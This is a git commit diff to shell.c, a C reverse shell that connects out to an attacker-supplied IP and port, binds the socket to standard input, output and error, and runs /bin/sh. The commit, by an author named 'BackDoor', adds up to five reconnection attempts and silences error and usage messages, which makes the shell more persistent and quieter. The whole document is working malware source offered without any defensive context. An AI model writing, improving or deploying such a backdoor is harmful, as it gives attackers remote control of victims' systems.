6b8362b6d063756ab40cac6d25330c1abb390b09
BackDoor <72059221+badboycxcc@users.noreply.github.com>
2022-10-11 12:54:52 +0800

    Update shell.c
    加入重连机制

--- shell.c
+++ shell.c
@@ -1,5 +1,5 @@
 #include <stdio.h>
-#include<stdlib.h>
+#include <stdlib.h>
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <unistd.h>
@@ -15,40 +15,56 @@
 #include <netdb.h>
 
 void usage();
-char shell[]="/bin/sh";
-char message[]="hi hacker welcome";
+char shell[] = "/bin/sh";
+char message[] = "hi cxaqhq \n";
 int sock;
-int main(int argc, char *argv[]) {
-if(argc <3){
-usage(argv[0]);
-}
+int a = 0;
 
-struct sockaddr_in server;
-if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
-printf("Couldn't make socket!n"); exit(-1);
-}
+int main(int argc, char *argv[])
+{
+	if (argc < 3)
+	{
+		usage(argv[0]);
+	}
 
-server.sin_family = AF_INET;
-server.sin_port = htons(atoi(argv[2]));
-server.sin_addr.s_addr = inet_addr(argv[1]);
+	// 重连次数
+	while (a < 5)
+	{
+		a ++;
+		struct sockaddr_in server;
+		if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
+		{
+			// 创建Socket 失败
+			// printf("Couldn't make socket!n");
+			sleep(10);// 滞停3s
+			continue;
+		}
 
-if(connect(sock, (struct sockaddr *)&server, sizeof(struct sockaddr)) == -1) {
-printf("Could not connect to remote shell!n");
-//exit(-1);
-//	return -1;
-	exit(-1);
+		server.sin_family = AF_INET;
+		server.sin_port = htons(atoi(argv[2]));
+		server.sin_addr.s_addr = inet_addr(argv[1]);
+
+		if (connect(sock, (struct sockaddr *)&server, sizeof(struct sockaddr)) == -1)
+		{
+			// 远程连接失败
+			// printf("Could not connect to remote shell!n");
+			sleep(10);// 滞停3s
+			continue;
+		}
+		send(sock, message, sizeof(message), 0);
+		dup2(sock, 0);
+		dup2(sock, 1);
+		dup2(sock, 2);
+		execl(shell, "/bin/sh", (char *)0);
+		close(sock);
+		return 1;
+
+	}
+	
 }
-send(sock, message, sizeof(message), 0);
-dup2(sock, 0);
-dup2(sock, 1);
-dup2(sock, 2);
-execl(shell,"/bin/sh",(char *)0);
-close(sock);
-return 1;
-}
-void usage(char *prog[]) {
-printf("Usage: %s <reflect ip> <port>\n", prog);
-//exit(-1);
-//	return -1;
+void usage(char *prog[])
+{
+	// 提示使用方法  
+	// printf("Usage: %s <reflect ip> <port>\n", prog);
 	exit(-1);
 }
